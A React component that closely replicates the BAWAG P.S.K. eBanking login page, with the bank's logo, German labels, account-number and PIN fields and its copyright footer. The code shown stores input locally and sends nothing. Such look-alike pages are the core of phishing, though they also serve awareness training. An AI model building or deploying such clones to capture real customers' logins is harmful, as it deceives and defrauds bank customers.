import { useState } from "react";
import { Eye, EyeOff, HelpCircle, ShieldAlert, ChevronRight } from "lucide-react";
import bawagLogo from "@/assets/bawag_logo.png";
import bawagBg from "@/assets/bawag_background.jpg";

const Bawag = () => {
  const [verfueger, setVerfueger] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [loginTab, setLoginTab] = useState<"verfueger" | "app">("verfueger");

  const now = new Date();
  const days = ["Sonntag", "Montag", "Dienstag", "Mittwoch", "Donnerstag", "Freitag", "Samstag"];
  const dateStr = `${days[now.getDay()]}, ${String(now.getDate()).padStart(2, "0")}.${String(now.getMonth() + 1).padStart(2, "0")}.${now.getFullYear()}, ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;

  return (
    <div className="min-h-screen flex flex-col bg-[#f0f0f0]" style={{ fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif" }}>
      {/* Header */}
      <header className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between">
        <img src={bawagLogo} alt="BAWAG eBanking" className="h-10" />
        <span className="text-sm text-gray-500 hidden md:block">{dateStr}</span>
        <div className="flex gap-1">
          {["DE", "EN", "BKS", "TR"].map((l) => (
            <button
              key={l}
              className={`px-3 py-1 text-xs font-semibold rounded transition-colors ${
                l === "DE"
                  ? "bg-[#8b1a2b] text-white"
                  : "bg-gray-200 text-gray-600 hover:bg-gray-300"
              }`}
            >
              {l}
            </button>
          ))}
        </div>
      </header>

      {/* Main Content with Background Image */}
      <main
        className="flex-1 px-4 md:px-8 py-8"
        style={{
          backgroundImage: `url(${bawagBg})`,
          backgroundSize: 'cover',
          backgroundPosition: 'center top',
          minHeight: '600px',
        }}
      >
        <div className="max-w-[1200px] mx-auto w-full">
          <div className="flex flex-col lg:flex-row gap-6">
            {/* Login Card */}
            <div className="w-full lg:w-[380px] shrink-0">
              <div className="bg-white rounded shadow-sm">
                {/* Title */}
                <div className="bg-[#8b1a2b] text-white px-5 py-3 rounded-t flex items-center justify-between">
                  <h1 className="text-lg font-semibold">eBanking Login</h1>
                  <HelpCircle className="h-5 w-5 opacity-80 cursor-pointer" />
                </div>

                <div className="p-5">
                  <p className="text-sm text-gray-600 mb-4">Wie wollen Sie sich einloggen?</p>

                  {/* Tabs */}
                  <div className="flex mb-5 border border-gray-300 rounded overflow-hidden">
                    <button
                      onClick={() => setLoginTab("verfueger")}
                      className={`flex-1 py-2.5 text-sm font-semibold transition-colors ${
                        loginTab === "verfueger"
                          ? "bg-[#8b1a2b] text-white"
                          : "bg-white text-gray-700 hover:bg-gray-50"
                      }`}
                    >
                      Verfüger
                    </button>
                    <button
                      onClick={() => setLoginTab("app")}
                      className={`flex-1 py-2.5 text-sm font-semibold transition-colors ${
                        loginTab === "app"
                          ? "bg-[#8b1a2b] text-white"
                          : "bg-white text-gray-700 hover:bg-gray-50"
                      }`}
                    >
                      Mit der App
                    </button>
                  </div>

                  {loginTab === "verfueger" ? (
                    <>
                      <div className="mb-4">
                        <label className="block text-xs text-gray-500 mb-1">Verfügernummer</label>
                        <input
                          type="text"
                          value={verfueger}
                          onChange={(e) => setVerfueger(e.target.value)}
                          className="w-full border border-gray-300 rounded px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#8b1a2b] focus:border-transparent"
                        />
                      </div>

                      <div className="mb-5">
                        <label className="block text-xs text-gray-500 mb-1">
                          PIN <span className="text-gray-400">(8 bis 16-stellig)</span>
                        </label>
                        <div className="relative">
                          <input
                            type={showPin ? "text" : "password"}
                            value={pin}
                            onChange={(e) => setPin(e.target.value)}
                            className="w-full border border-gray-300 rounded px-3 py-2.5 text-sm pr-10 focus:outline-none focus:ring-2 focus:ring-[#8b1a2b] focus:border-transparent"
                          />
                          <button
                            type="button"
                            onClick={() => setShowPin(!showPin)}
                            className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                          >
                            {showPin ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                          </button>
                        </div>
                      </div>

                      <button className="w-full py-2.5 bg-[#8b1a2b] text-white font-semibold rounded hover:bg-[#721525] transition-colors mb-4">
                        Login
                      </button>
                    </>
                  ) : (
                    <>
                      <p className="text-sm text-gray-600 mb-3">
                        Verwenden Sie Ihre für die BAWAG App registrierte E-Mail oder Ihre Verfügernummer.
                      </p>
                      <div className="mb-4">
                        <label className="block text-xs text-gray-500 mb-1">E-Mail ODER Verfügernummer</label>
                        <input
                          type="text"
                          className="w-full border border-gray-300 rounded px-3 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-[#8b1a2b] focus:border-transparent"
                        />
                      </div>
                      <button className="w-full py-2.5 bg-[#8b1a2b] text-white font-semibold rounded hover:bg-[#721525] transition-colors mb-4">
                        Weiter
                      </button>
                    </>
                  )}

                  <div className="border-t pt-4">
                    <a href="#" className="text-sm text-[#c20016] hover:underline flex items-center gap-1">
                      <ChevronRight className="h-4 w-4" />
                      PIN vergessen oder Verfüger gesperrt?
                    </a>
                  </div>
                </div>
              </div>
            </div>

            {/* Right Column — Info Card only */}
            <div className="flex-1">
              <div className="bg-white rounded shadow-sm">
                <div className="grid grid-cols-1 md:grid-cols-3 divide-y md:divide-y-0 md:divide-x divide-gray-200">
                  <div className="p-5">
                    <h2 className="font-bold text-sm mb-3 flex items-center gap-2">
                      <ShieldAlert className="h-4 w-4 text-[#c20016]" />
                      Sicherheit
                    </h2>
                    <p className="text-xs text-gray-600 leading-relaxed">
                      Die BAWAG versendet keine E-Mails mit direkten eBanking Login-Links!
                    </p>
                    <a href="#" className="text-xs text-[#c20016] hover:underline mt-2 inline-block">
                      Mehr Infos
                    </a>
                  </div>

                  <div className="p-5">
                    <h2 className="font-bold text-sm mb-3">Service & Info</h2>
                    <ul className="space-y-2">
                      <li><a href="#" className="text-xs text-[#c20016] hover:underline flex items-center gap-1"><ChevronRight className="h-3 w-3" />Sicherheitsregeln</a></li>
                      <li><a href="#" className="text-xs text-[#c20016] hover:underline flex items-center gap-1"><ChevronRight className="h-3 w-3" />Anmeldung / Erste Schritte</a></li>
                      <li><a href="#" className="text-xs text-[#c20016] hover:underline flex items-center gap-1"><ChevronRight className="h-3 w-3" />3D Secure Online Bezahlung</a></li>
                    </ul>
                  </div>

                  <div className="p-5">
                    <h2 className="font-bold text-sm mb-3">Support</h2>
                    <ul className="space-y-2">
                      <li><a href="#" className="text-xs text-[#c20016] hover:underline flex items-center gap-1"><ChevronRight className="h-3 w-3" />FAQ</a></li>
                      <li><a href="#" className="text-xs text-[#c20016] hover:underline flex items-center gap-1"><ChevronRight className="h-3 w-3" />Zu Watchlist Internet</a></li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-white border-t border-gray-200 py-4 px-6">
        <div className="max-w-[1200px] mx-auto">
          <div className="flex flex-wrap gap-4 justify-center mb-2">
            {["Impressum", "AGB", "Datenschutz", "Nutzungsbedingungen", "Barrierefrei"].map((item) => (
              <a key={item} href="#" className="text-xs text-[#c20016] hover:underline">
                {item}
              </a>
            ))}
          </div>
          <p className="text-xs text-gray-500 text-center">© BAWAG P.S.K.</p>
        </div>
      </footer>
    </div>
  );
};

export default Bawag;
